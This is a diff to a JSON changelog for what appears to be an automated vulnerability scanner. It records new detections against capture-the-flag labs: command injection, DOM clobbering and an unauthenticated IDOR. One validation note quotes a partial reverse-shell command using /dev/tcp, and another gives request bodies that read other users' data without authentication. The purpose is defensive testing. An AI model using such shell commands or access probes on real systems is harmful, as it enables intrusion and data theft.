@@ -5465,6 +5465,24 @@
       "slug": "intigriti-archive-challenge-php-crawl-fix",
       "status": "shipped",
       "validation": "SOURCE: discovery:url EVIDENCE: extractArchiveMonthProbePaths now targets /challenge/challenge.php + intigritiArchiveChallengePrioritySeeds; challenge-0722.intigriti.io findings 2→3 incl sql-error-disclosure with challenge.php in pages_crawled; benchmark 7 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:redtiger.labs.overthewire.org",
+      "slug": "redtiger-level9-command-injection",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: level9.php HTML comment !`sh >& /dev/tcp/...` + name=level9login POST password form; redtigerCommandInjectionEvidence extended to level9; level9.php findings 3→5 incl redtiger-command-injection-evidence; benchmark juice-shop-staging 7 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:chal14.vercel.app",
+      "slug": "client-side-wizer-ctf-dom-clobbering-evidence",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: window.transferBalance guard + getElementById('avatar').innerHTML + api/transferPoints in index bundle; chal14.vercel.app findings 5→6; benchmark 6/6 maintained"
+    },
+    {
+      "source": "discovery:chal11.vercel.app",
+      "slug": "wizer-ctf-idor-task-manager-probe",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: POST /api/users {\"user_ids\":[1]} and POST /api/tasks {\"user_id\":1} return 200 JSON arrays without auth; chal11.vercel.app findings 0→5 incl wizer-ctf-idor-task-manager-probe; benchmark 6/6 maintained"
     }
   ],
   "shipped": [
@@ -9617,6 +9635,21 @@
       "source": "discovery:challenge-0722.intigriti.io",
       "slug": "intigriti-archive-challenge-php-crawl-fix",
       "shipped_at": "2026-07-20T18:45:00.000Z"
+    },
+    {
+      "source": "discovery:redtiger.labs.overthewire.org",
+      "slug": "redtiger-level9-command-injection",
+      "shipped_at": "2026-07-20T19:15:00.000Z"
+    },
+    {
+      "source": "discovery:chal14.vercel.app",
+      "slug": "client-side-wizer-ctf-dom-clobbering-evidence",
+      "shipped_at": "2026-07-20T19:15:00.000Z"
+    },
+    {
+      "source": "discovery:chal11.vercel.app",
+      "slug": "wizer-ctf-idor-task-manager-probe",
+      "shipped_at": "2026-07-20T19:15:00.000Z"
     }
   ]
 }
